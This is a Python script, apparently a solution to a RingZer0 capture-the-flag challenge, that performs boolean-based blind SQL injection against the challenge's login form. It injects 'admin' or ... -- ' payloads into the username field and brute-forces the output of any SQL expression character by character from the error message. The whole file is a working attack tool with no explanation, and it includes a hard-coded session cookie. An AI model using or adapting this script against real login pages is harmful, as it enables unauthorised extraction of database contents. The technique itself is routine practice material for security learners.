import requests
from requests.auth import HTTPBasicAuth
import sys
from bs4 import BeautifulSoup

session = requests.Session()

def test(input):
    #username = "admi'|if("+input+",'n','777')|'"
    #username = "username=admi'|if(1,'n','777')|'"
    username = "admin' or "+input+" -- "
    post_data = {'username':username,'password':'123'}
    #print post_data
    headers = {"Accept-Encoding": "gzip, deflate",
               "Accept-Language": "en-US,en;q=0.5",
               "User-Agent": "Mozilla/5.0 (Windows NT 6.1; WOW64; rv:32.0) Gecko/20100101 Firefox/32.0",
				"Cookie":"_ga=GA1.2.517894686.1428888833; PHPSESSID=868o1ie294736cp10gt82v7j95; _gat=1",
				"Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8", "Connection": "keep-alive"}
    response = session.post("http://ringzer0team.com/challenges/4", headers=headers,data=post_data)
    #print response.text
	
    bs = BeautifulSoup(response.text.replace("</br />",""))
    form_section = bs.findAll('div', {"class": "alert alert-danger"}) #Error message
    t = form_section[0]
    return ("Wrong password" in str(t))

def brute_force_expr(expr,prefix_word):
    ascii_i=40 #(
    
    word = prefix_word
    ch_i = len(word) + 1 

    while True:
        found_char=False
        while(ascii_i<160): #~
            res = test("ascii(substring(("+expr+"),"+str(ch_i)+",1))="+str(ascii_i))
            if(res):
                word += chr(ascii_i)
                print "Found (",ch_i,") ",chr(ascii_i)," - ",word
                found_char = True
                break
            ascii_i+=1

        if(not found_char):
            print "No char at index ",ch_i," .. ending string construction.."
            break

        ascii_i = 40
        ch_i+=1
    return word

print brute_force_expr(sys.argv[1] , sys.argv[2]) #Replacement fix the spaces problem!
